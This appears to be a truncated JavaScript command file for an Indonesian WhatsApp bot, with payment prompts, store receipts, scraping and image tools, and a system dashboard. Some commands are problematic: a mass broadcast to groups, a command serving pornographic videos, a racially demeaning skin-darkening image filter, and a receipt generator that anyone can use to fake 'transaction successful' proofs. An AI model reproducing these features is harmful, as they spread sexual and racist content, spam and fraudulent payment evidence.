                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Putzz.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~function bug~~~~~~~~~~~//


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pay": case "payment": case "qris": {
await Putzz.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Payment Lain',
          sections: [
            {
              title: 'List Payment',
              rows: [
                {
                  title: 'DANA',
                  id: '.dana'
                },
                {
                  title: 'OVO',
                  id: '.ovo'
                },                
                {
                  title: 'GOPAY',
                  id: '.gopay'
                },
                {
                  title: 'SHOPEEPAY',
                  id: '.shopeepay'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: global.image.qris}, 
  caption: "\n```Scan qris diatas dan jika sudah transfer mohon sertakan bukti```\n"
}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "dana": {
if (!isCreator) return
let teks = `
*PAYMENT DANA ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.dana}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await Putzz.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ovo": {
if (!isCreator) return
let teks = `
*PAYMENT OVO ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.ovo}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await Putzz.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gopay": {
if (!isCreator) return
let teks = `
*PAYMENT GOPAY ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.gopay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await Putzz.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shopepay": {
if (!isCreator) return
let teks = `
*PAYMENT SHOPEPAY ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.shopepay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await Putzz.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
ReplyLanz(jsonData)
} 
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "toaudio": case "tovn": {
//if (!/video|mp4/.test(mime)) return ReplyLanz(example("dengan Reply/kirim vidio"))
const vid = await Putzz.downloadAndSaveMediaMessage(qmsg)
const result = await toAudio(fs.readFileSync(vid), "mp4")
await Putzz.sendMessage(m.chat, { audio: result, mimetype: "audio/mpeg", ptt: /tovn/.test(command) ? true : false }, { quoted: m })
await fs.unlinkSync(vid)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "proses": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!q) return ReplyLanz(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await Putzz.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: ppmenu, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "sc": case "infobot":{
Putzz.sendMessage(m.chat, {
  location: {
    degreesLatitude: -6.2088, // Ganti dengan latitude lokasi
    degreesLongitude: 106.8456, // Ganti dengan longitude lokasi
  },
  caption: `*\`乂 INFO/SC - BOT 乂\`*
> nameown : ${global.namaOwner}
> namebot : ${global.botname2}
> versi : ${global.versi}
> tipe : case.js
> total pengguna : ${Object.keys(db.users).length}
> total fitur : ${totalFitur()}
> get script di wa.me/6283824410117?text=bang+minta+sc+🗿
`,
  footer: "©copyright by Putzz",//hati hati ini hak cipta
  buttons: [
          { buttonId: `.menu`,
          buttonText: {
          displayText: 'back menu awal'
          },
           type: 1 }
          ], // isi buttons nya
  headerType: 6,
  viewOnce: true
}, { quoted: qlive });
}
//D|ts si pler 🐎
break 
case 'nobg2':
case 'removebg2': {
if (!/image/.test(mime)) ReplyLanz(`*Reply Image With Caption* ${prefix + command}`)
if (!qmsg) ReplyLanz(`*Reply Image With Caption* ${prefix + command}`)
let { TelegraPh } = require('./library/uploader')
let media = await Putzz.downloadAndSaveMediaMessage(qmsg)
let anu = await TelegraPh(media)
await Putzz.sendMessage(m.chat, { image : { url : 'https://love.neekoi.me/r-bg?url=' + util.format(anu) }, caption: `ini... udah aku hapus :3` }, { quoted: m })
}
//D|ts si pler 🐎
break 

case 'bokep':{
if (!isCreator && !isPremium) return ReplyLanz(mess.prem)
if (m.isGroup) return ReplyLanz('*`maybee` harap gunakan di private chat*')
const caption = `> ${command}`;
let heyy
if (/bokep/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/ditss-dev/ditss/main/okep')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]

				Putzz.sendMessage(m.chat,{
			 video: {url:yeha},
 //thumbnailUrl: rees.thumbnail,
 //renderLargerThumbnail: true,
					caption: caption,
					footer: `\n${botname2}`,
					buttons: [
						{
							buttonId: `.${command}`,
							buttonText: {
								displayText: "lanjutt"
							}
						},
                       						{
							buttonId: `.toaudio`,

							buttonText: {
								displayText: "back sound"
							}
						}
					],
					viewOnce: true,
				}, {
					quoted: m
				});
			}
			//D|ts si pler 🐎
break 
case "cerpen":
if (!text) return ReplyLanz('`Masukan type: .cerpen anak`')
 function cerpen(category) {
 return new Promise(async (resolve, reject) => {
 try {
 let title = category.toLowerCase().replace(/[()*]/g, "");
 let judul = title.replace(/\s/g, "-");
 let page = Math.floor(Math.random() * 5) + 1; 

 let get = await axios.get('http://cerpenmu.com/category/cerpen-' + judul + '/page/' + page);
 let $ = cheerio.load(get.data);
 let link = [];

 $('article.post').each(function (a, b) {
 link.push($(b).find('a').attr('href'));
 });

 if (link.length === 0) {
 return reject("No stories found for this category.");
 }

 let random = link[Math.floor(Math.random() * link.length)];
 let res = await axios.get(random);
 let $$ = cheerio.load(res.data);

 let hasil = {
 title: $$('#content > article > h1').text(),
 author: $$('#content > article').text().split('Cerpen Karangan: ')[1]?.split('Kategori: ')[0]?.trim(),
 kategori: $$('#content > article').text().split('Kategori: ')[1]?.split('\n')[0]?.trim(),
 lolos: $$('#content > article').text().split('Lolos moderasi pada: ')[1]?.split('\n')[0]?.trim(),
 cerita: $$('#content > article > p').text()
 };

 resolve(hasil);
 } catch (error) {
 reject(error);
 }
 });
}


 try {
 var data = await cerpen(text);
 var textpp = `Title : ${data.title}\n`;
 textpp += `Author : ${data.author}\n`;
 textpp += `Category : ${data.kategori}\n`;
 textpp += `Approved on : ${data.lolos}\n`;
 textpp += `Story :\n${data.cerita}`;

 ReplyLanz(textpp);
 } catch (error) {
 console.error(error);
 ReplyLanz("An error occurred while fetching the story.");
 }
//D|ts si pler 🐎
break 
case 'done': {
	let t = text.split(',');
	if (t.length < 2) return ReplyLanz(`*Format salah!*

Penggunaan:
${prefix + command} barang,nominal,payment`);
	let barang = t[0];
	let nominal = t[1];
	let payment = t[2];
	ReplyLanz(`━━━❏⟩ 𝗣𝘂𝘁𝘇𝘇 𝗦𝘁𝗼𝗿𝗲 ⟨❏━━━
*━━━━━━━━━━━━━━━━━━*
*ALHAMDULILLAH TRX DONE* ✅
*━━━━━━━━━━━━━━━━━━*
📦 *BARANG:* *${barang}*
💰 *NOMINAL:* *Rp${nominal}*
📆 *TANGGAL:* *${tanggal(Date.now())}*
💳 *PAYMENT:* *${payment}*
✅ *STATUS:* *BERHASIL*

‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎  ‎⟨ 𝗔𝗟𝗟 𝗧𝗥𝗫 𝗡𝗢 𝗥𝗘𝗙𝗙 ⟩
*▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬*
𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛 𝗧𝗘𝗟𝗔𝗛 𝗢𝗥𝗗𝗘𝗥 𝗗𝗜 𝗣𝗨𝗧𝗭𝗭𝗦𝗧𝗢𝗥𝗘
𝗦𝗘𝗠𝗢𝗚𝗔 𝗦𝗨𝗞𝗔 𝗗𝗘𝗡𝗚𝗔𝗡 𝗣𝗥𝗢𝗗𝗨𝗞 𝗬𝗔𝗡𝗚
𝗞𝗔𝗠𝗜 𝗦𝗘𝗗𝗜𝗔𝗞𝗔𝗡 𝗗𝗔𝗡 𝗝𝗔𝗗𝗜 𝗟𝗔𝗡𝗚𝗚𝗔𝗡𝗔𝗡😇
`)
}
break

case "donee": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!q) return ReplyLanz(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await Putzz.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: ppmenu, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "developerbot": case "owner2": {
await Putzz.sendContact(m.chat, [global.owner], m)
}
break
case "masput":
case 'owner': {
let name = m.pushName || Putzz.getName(m.sender);
let pan = `
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
_\`Owner & Dev Lanz/Putzz\`_ 
▰▰▰▰▰▰▰▰▰▰▰▰▰▰
`;
const url = ppmenu
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: Putzz.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: pan
          },
          carouselMessage: {
            cards: [
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: ppmenu } }, { upload: Putzz.waUploadToServer })),
          title: `Mikasa | MULTI DEVICE`,
          gifPlayback: true,
          subtitle: 'LanzOfficial',
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏━━━━━━━━━━━━━━━━
┃ ｢ \`𝘾𝙍𝙀𝘼𝙏𝙊𝙍 𝘽𝙊𝙏\` ｣
┃════════════════
┃┉〣 \`LanzCihuyy\` 〣┉
┃• *JANGAN SPAM OWNER*
┃• *CHAT LANGSUNG KE INTI NYA*
┃• *JANGAN TELPON OWNER*
┃• *SARAN FITUR CHAT AE*
┗━━━━━━━━━━━━━━━━━`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"Cretor Lanz/Putzz","url":"https://wa.me/6283852426553","merchant_url":"https://wa.me/6283852426553"}`
                    },
                  ],
                },
              },
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: ppmenu } }, { upload: Putzz.waUploadToServer })),
          title: `Mikasa | Multi Device`,
          gifPlayback: true,
          subtitle: 'Saluran',
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏━━━━━━━━━━━━━━━━
┃ ｢ \`𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝙄𝙉𝙁𝙊\` ｣
┃════════════════
┃┉〣 \`Mikasa MD | INFORMATION\` 〣┉
┃• *SALURAN RESMI LANZCIHUYY*
┃• *JOIN CUY*
┗━━━━━━━━━━━━━━━━━`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"LanzOfficial | Information","url":"https://whatsapp.com/channel/0029Vax8HY61dAwBEIeWbE1G","merchant_url":"https://whatsapp.com/channel/0029Vax8HY61dAwBEIeWbE1G"}`
                    },
                  ],
                },
              },
                              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: ppmenu } }, { upload: Putzz.waUploadToServer })),
          title: `Mikas | Multi Device`,
          gifPlayback: true,
          subtitle: 'Saluran',
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏━━━━━━━━━━━━━━━━
┃ ｢ \`𝙏𝙄𝙆𝙏𝙊𝙆 𝙇𝘼𝙉𝙕𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇\` ｣
┃════════════════
┃┉〣 \`Mikasa MD\` 〣┉
┃•  𝗔𝗟𝗟 𝗣𝗥𝗢𝗗𝗨𝗞 𝗟𝗮𝗻𝘇𝗖𝗶𝗵𝘂𝘆𝘆𝗬
┃• *ALL JASA LANZCIHUYY*
┃• *YAPPING LANZCIHUYY*
┃• *ABOUT LANZCIHUYY*
┃• *CONTACT LANZCIHUYY*
┗━━━━━━━━━━━━━━━━━`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"WEBSITE PUTZZ STORE","url":"https://lanzcihuyyy-apitermux.vercel.app","merchant_url":"https://lanzcihuyyy-apitermux.vercel.app"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    },
  },
  {}
);

await Putzz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});

}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "tyap":
case "topyapping": {

let data = global.yapping[m.chat]?.[nowDate] || {}

if (!Object.keys(data).length)
return ReplyLanz("Belum ada data yapping di grup ini.")

let top = Object.entries(data)
.sort((a,b) => b[1] - a[1])
.slice(0,5)

let pollVotes = []

for (let i = 0; i < top.length; i++) {
    let name = await Putzz.getName(top[i][0])

    pollVotes.push({
        optionName: `${i+1}. ${name}`,
        optionVoteCount: top[i][1]
    })
}

let content = {
    pollResultSnapshotMessage: {
        pollVotes,
        name: "🏆 TOP YAPPING GRUP INI",
        contextInfo: {
      forwardingScore: 127,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363404782325678@newsletter",
        serverMessageId: 0,
        newsletterName: "LanzOffcial"
      },
      forwardOrigin: 0
    },
        pollType: 0
    }
}

await Putzz.relayMessage(m.chat, content, {})
}
break;
case "save": case "sv": {
if (!isCreator) return
await Putzz.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "privat": {
if (!isCreator) return
Putzz.public = false
ReplyLanz("Berhasil mengganti ke mode *privat*")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "getcase1": {
if (!isCreator) return ReplyLanz(mess.owner);
if (!text) return ReplyLanz(example("menu"));
const getcase = (cases) => {
const fileContent = fs.readFileSync('.)system/Putzz.js').toString();
const caseRegex = new RegExp(`case ['"]${cases}['"]`, 'i'); // Pencarian case dengan tanda ' atau "
const match = fileContent.split(caseRegex);
if (match.length < 2) throw new Error("Case not found");
return "case " + `'${cases}'` + match[1].split("break")[0] + "break";
};
try {
ReplyLanz(`${getcase(q)}`);
} catch (e) {
return ReplyLanz(`Case *${text}* Tidak Ditemukan`);
}
}
break;


case "getcase2": {
    if (!isCreator) return;
    if (!text) return ReplyLanz(example("menu"));

    try {
        const getCase = (cases) => {
            const fileContent = fs.readFileSync('./system/Putzz.js', 'utf-8');
            const splitContent = fileContent.split(`case "${cases}"`);
            
            if (splitContent.length < 2) throw new Error(); 
            
            return `case "${cases}"` + splitContent[1].split("break")[0] + "break";
        };

        ReplyLanz(getCase(text));
    } catch (e) {
        ReplyLanz(`❌ Case *${text}* tidak ditemukan.`);
    }
}
break;

case 'getcase4': {
    if (!isCreator) return ReplyLanz(mess.owner);
    if (!text) return ReplyLanz('Harap masukkan nama case yang ingin dicari! 🧐');
    try {
        const caseName = text.replace(/^['"]|['"]$/g, '');
        const getCase = (cases) => {
            const fileContent = fs.readFileSync("./Putz.js", "utf-8");
            const caseBlock = fileContent.split(`case '${cases}'`)[1];
            if (!caseBlock) throw new Error('Case not found');
            return `case '${cases}'` + caseBlock.split("break")[0] + "break";
        }
        ReplyLanz(`${getCase(caseName)}`);
    } catch (err) {
        ReplyLanz(`Case '${text}' tidak ditemukan! 🚫`);
    }
}
break

case "cekkhodam": case "cekkodam": {
  if (!text) return ReplyLanz('❌ Masukkan nama untuk mengecek khodam.');
  ReplyLanz(mess.wait);
//  const  require('axios');
  let apiUrl = `https://nirkyy.koyeb.app/api/v1/khodam?nama=${encodeURIComponent(text)}`;
  try {
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    Putzz.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: `🔮 *Hasil Cek Khodam* 🔮\n\n📌 *Nama:* ${text}`
    }, { quoted: m });
  } catch (error) {
    console.log(error);
    ReplyLanz(`❌ Error\nLogs error : ${error.message}`);
  }
}
break

case "colorize": {
    if (!/image/.test(mime)) return ReplyLanz("Kirim atau Reply gambar dengan caption *.colorize*");

    let media = await Putzz.downloadAndSaveMediaMessage(qmsg);
    const { ImageUploadService } = require('node-upload-images');
    const service = new ImageUploadService('pixhost.to');

    try {
        const { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'biyuofficial.png');
        const res = await fetch(`https://api.ryzendesu.vip/api/ai/colorize?url=${directLink}`);
        if (!res.ok || !res.headers.get('content-type')?.startsWith('image/')) {
            return ReplyLanz("❌ Gagal: Respons bukan gambar atau server error.");
        }
        const hasil = await res.buffer();
        await Putzz.sendMessage(m.chat, { image: hasil, caption: "✅ Berhasil diwarnai!" }, { quoted: m });
    } catch (err) {
        console.error(err);
        ReplyLanz("❌ Terjadi kesalahan saat proses colorize.");
    } finally {
        await fs.unlinkSync(media);
    }
}
break

case "hytamkan": {
    const q = m.quoted ? m.quoted : m
    const mime = (q.msg || q).mimetype || ''
  if (!/image/.test(mime)) return ReplyLanz("Reply gambar yang mau dihitamin dengan caption *hytamkan*");
  const mediaPath = await Putzz.downloadAndSaveMediaMessage(qmsg);
  const buffer = fs.readFileSync(mediaPath);
  const base64Image = buffer.toString("base64");
  try {
//const require('axios');
    const response = await axios({
      url: "https://negro.consulting/api/process-image",
      method: "POST",
      data: {
        filter: "hitam",
        imageData: "data:image/png;base64," + base64Image
      }
    });

    const resultBuffer = Buffer.from(response.data.processedImageUrl.replace("data:image/png;base64,", ""), "base64");
    await Putzz.sendMessage(m.chat, { image: resultBuffer, caption: `Selesai, pake filter *hitam*` }, { quoted: m });

    fs.unlinkSync(mediaPath);
  } catch (err) {
    console.log(err);
    ReplyLanz("Gagal memproses gambar.");
  }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "ping": case "os": {
    try {
        const THEME = {
            bg: "#0f1419", bgSecondary: "#1a1f2e", card: "#1e2433", cardHover: "#252b3d",
            primary: "#3b82f6", success: "#10b981", warning: "#f59e0b", danger: "#ef4444",
            purple: "#8b5cf6", cyan: "#06b6d4", pink: "#ec4899", textPrimary: "#f1f5f9",
            textSecondary: "#94a3b8", textTertiary: "#64748b", border: "#2d3548", glow: "rgba(59, 130, 246, 0.2)"
        };

        const formatSize = (bytes) => {
            if (bytes === 0) return '0 B';
            const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
            const i = Math.floor(Math.log(bytes) / Math.log(1024));
            return (bytes / Math.pow(1024, i)).toFixed(2) + ' ' + sizes[i];
        };

        const formatTime = (seconds) => {
            seconds = Number(seconds);
            const d = Math.floor(seconds / (3600 * 24));
            const h = Math.floor(seconds % (3600 * 24) / 3600);
            const m = Math.floor(seconds % 3600 / 60);
            const s = Math.floor(seconds % 60);
            if (d > 0) return `${d}d ${h}h ${m}m`;
            if (h > 0) return `${h}h ${m}m`;
            return `${m}m ${s}s`;
        };

        function drawBackground(ctx, w, h) {
            const gradient = ctx.createLinearGradient(0, 0, w, h);
            gradient.addColorStop(0, THEME.bg);
            gradient.addColorStop(0.5, THEME.bgSecondary);
            gradient.addColorStop(1, THEME.bg);
            ctx.fillStyle = gradient;
            ctx.fillRect(0, 0, w, h);
            ctx.globalAlpha = 0.02;
            for (let i = 0; i < 100; i++) {
                const x = Math.random() * w;
                const y = Math.random() * h;
                const size = Math.random() * 2;
                ctx.fillStyle = THEME.textPrimary;
                ctx.beginPath();
                ctx.arc(x, y, size, 0, Math.PI * 2);
                ctx.fill();
            }
            ctx.globalAlpha = 1;
            ctx.strokeStyle = THEME.border;
            ctx.lineWidth = 1;
            for (let i = 0; i < w; i += 50) {
                ctx.globalAlpha = 0.03;
                ctx.beginPath(); ctx.moveTo(i, 0); ctx.lineTo(i, h); ctx.stroke();
            }
            for (let i = 0; i < h; i += 50) {
                ctx.globalAlpha = 0.03;
                ctx.beginPath(); ctx.moveTo(0, i); ctx.lineTo(w, i); ctx.stroke();
            }
            ctx.globalAlpha = 1;
        }

        function drawCard(ctx, x, y, w, h, radius) {
            ctx.save();
            ctx.shadowColor = THEME.glow;
            ctx.shadowBlur = 15;
            ctx.beginPath();
            ctx.roundRect(x, y, w, h, radius);
            ctx.fillStyle = THEME.card;
            ctx.fill();
            ctx.shadowBlur = 0;
            ctx.strokeStyle = THEME.border;
            ctx.lineWidth = 1;
            ctx.stroke();
            ctx.restore();
        }

        function drawIcon(ctx, x, y, type, color) {
            ctx.save();
            ctx.strokeStyle = color;
            ctx.fillStyle = color;
            ctx.lineWidth = 2.5;
            ctx.lineCap = 'round';
            ctx.lineJoin = 'round';
            switch (type) {
                case 'cpu':
                    ctx.strokeRect(x - 12, y - 12, 24, 24);
                    ctx.fillRect(x - 6, y - 6, 12, 12);
                    ctx.beginPath();
                    ctx.moveTo(x - 12, y - 8); ctx.lineTo(x - 16, y - 8);
                    ctx.moveTo(x - 12, y); ctx.lineTo(x - 16, y);
                    ctx.moveTo(x - 12, y + 8); ctx.lineTo(x - 16, y + 8);
                    ctx.moveTo(x + 12, y - 8); ctx.lineTo(x + 16, y - 8);
                    ctx.moveTo(x + 12, y); ctx.lineTo(x + 16, y);
                    ctx.moveTo(x + 12, y + 8); ctx.lineTo(x + 16, y + 8);
                    ctx.stroke();
                    break;
                case 'memory':
                    for (let i = 0; i < 4; i++) { ctx.strokeRect(x - 10 + i * 6, y - 12, 5, 24); }
                    break;
                case 'disk':
                    ctx.beginPath(); ctx.arc(x, y, 12, 0, Math.PI * 2); ctx.stroke();
                    ctx.beginPath(); ctx.arc(x, y, 8, 0, Math.PI * 2); ctx.stroke();
                    ctx.beginPath(); ctx.arc(x, y, 3, 0, Math.PI * 2); ctx.fill();
                    break;
                case 'network':
                    ctx.beginPath(); ctx.arc(x, y, 12, 0, Math.PI * 2); ctx.stroke();
                    ctx.beginPath(); ctx.moveTo(x, y - 8); ctx.lineTo(x, y + 8);
                    ctx.moveTo(x - 8, y); ctx.lineTo(x + 8, y); ctx.stroke();
                    ctx.beginPath(); ctx.arc(x - 6, y - 6, 2, 0, Math.PI * 2);
                    ctx.arc(x + 6, y - 6, 2, 0, Math.PI * 2);
                    ctx.arc(x - 6, y + 6, 2, 0, Math.PI * 2);
                    ctx.arc(x + 6, y + 6, 2, 0, Math.PI * 2);
                    ctx.fill();
                    break;
                case 'server':
                    for (let i = 0; i < 3; i++) {
                        ctx.strokeRect(x - 12, y - 10 + i * 8, 24, 6);
                        ctx.beginPath(); ctx.arc(x + 8, y - 7 + i * 8, 1.5, 0, Math.PI * 2); ctx.fill();
                    }
                    break;
                case 'clock':
                    ctx.beginPath(); ctx.arc(x, y, 12, 0, Math.PI * 2); ctx.stroke();
                    ctx.beginPath(); ctx.moveTo(x, y); ctx.lineTo(x, y - 8);
                    ctx.moveTo(x, y); ctx.lineTo(x + 6, y); ctx.stroke();
                    break;
            }
            ctx.restore();
        }

        function drawLogo(ctx, x, y, size) {
            ctx.save();
            const gradient = ctx.createLinearGradient(x - size, y - size, x + size, y + size);
            gradient.addColorStop(0, THEME.primary);
            gradient.addColorStop(0.5, THEME.cyan);
            gradient.addColorStop(1, THEME.purple);
            ctx.strokeStyle = gradient;
            ctx.lineWidth = 3;
            ctx.lineCap = 'round';
            ctx.beginPath(); ctx.moveTo(x - size, y); ctx.lineTo(x, y - size); ctx.lineTo(x + size, y); ctx.lineTo(x, y + size); ctx.closePath(); ctx.stroke();
            ctx.beginPath(); ctx.moveTo(x - size / 2, y); ctx.lineTo(x, y - size / 2); ctx.lineTo(x + size / 2, y); ctx.lineTo(x, y + size / 2); ctx.closePath(); ctx.stroke();
            ctx.restore();
        }

        function drawDonutChart(ctx, x, y, radius, lineWidth, percent, color) {
            ctx.save();
            ctx.lineCap = 'round';
            ctx.beginPath(); ctx.arc(x, y, radius, 0, Math.PI * 2);
            ctx.strokeStyle = THEME.bgSecondary; ctx.lineWidth = lineWidth; ctx.stroke();
            const startAngle = -Math.PI / 2;
            const endAngle = startAngle + (Math.PI * 2 * (percent / 100));
            ctx.shadowColor = color; ctx.shadowBlur = 10;
            ctx.beginPath(); ctx.arc(x, y, radius, startAngle, endAngle);
            ctx.strokeStyle = color; ctx.lineWidth = lineWidth; ctx.stroke();
            ctx.shadowBlur = 0;
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 28px Arial";
            ctx.textAlign = "center"; ctx.textBaseline = "middle";
            ctx.fillText(`${Math.round(percent)}%`, x, y);
            ctx.restore();
        }

        function drawProgressBar(ctx, x, y, w, h, percent, color, label, value) {
            ctx.fillStyle = THEME.bgSecondary; ctx.fillRect(x, y, w, h);
            const gradient = ctx.createLinearGradient(x, y, x + w, y);
            gradient.addColorStop(0, color); gradient.addColorStop(1, color + 'aa');
            ctx.fillStyle = gradient; ctx.fillRect(x, y, w * (percent / 100), h);
            ctx.strokeStyle = THEME.border; ctx.lineWidth = 1; ctx.strokeRect(x, y, w, h);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.textAlign = "left"; ctx.fillText(label, x, y - 6);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 11px Arial"; ctx.textAlign = "right"; ctx.fillText(value, x + w, y - 6);
        }

        function drawStatBox(ctx, x, y, w, h, label, value, color, iconType) {
            drawCard(ctx, x, y, w, h, 12);
            drawIcon(ctx, x + 28, y + 28, iconType, color);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.textAlign = "left"; ctx.fillText(label, x + 50, y + 22);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 16px Arial"; ctx.fillText(value, x + 50, y + 40);
        }

        async function renderDashboard(stats) {
            const W = 1200;
            const H = 800;
            const canvas = createCanvas(W, H);
            const ctx = canvas.getContext('2d');

            drawBackground(ctx, W, H);
            drawLogo(ctx, 60, 50, 20);

            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 32px Arial"; ctx.textAlign = "left"; ctx.fillText("SYSTEM MONITOR", 100, 58);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "13px Arial"; ctx.fillText("Real-time Performance Dashboard", 100, 80);

            const pingStatus = stats.ping < 100 ? THEME.success : stats.ping < 300 ? THEME.warning : THEME.danger;
            ctx.fillStyle = pingStatus; ctx.font = "bold 28px Arial"; ctx.textAlign = "right"; ctx.fillText(`${stats.ping}ms`, W - 50, 50);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "12px Arial"; ctx.fillText("LATENCY", W - 50, 70);

            const gradient = ctx.createLinearGradient(50, 100, W - 50, 100);
            gradient.addColorStop(0, THEME.primary); gradient.addColorStop(0.33, THEME.success); gradient.addColorStop(0.66, THEME.purple); gradient.addColorStop(1, THEME.cyan);
            ctx.strokeStyle = gradient; ctx.lineWidth = 2; ctx.beginPath(); ctx.moveTo(50, 100); ctx.lineTo(W - 50, 100); ctx.stroke();

            const mainY = 130, cardW = 260, cardH = 240, gap = 30;
            const x1 = 50, x2 = x1 + cardW + gap, x3 = x2 + cardW + gap, x4 = x3 + cardW + gap;

            drawCard(ctx, x1, mainY, cardW, cardH, 15);
            drawIcon(ctx, x1 + 30, mainY + 35, 'cpu', THEME.primary);
            ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 18px Arial"; ctx.textAlign = "left"; ctx.fillText("CPU USAGE", x1 + 55, mainY + 40);
            ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.fillText(`${stats.cpuCores} Cores @ ${stats.cpuSpeed} MHz`, x1 + 55, mainY + 58);
            drawDonutChart(ctx, x1 + cardW / 2, mainY + 140, 50, 12, stats.cpuLoad, THEME.primary);
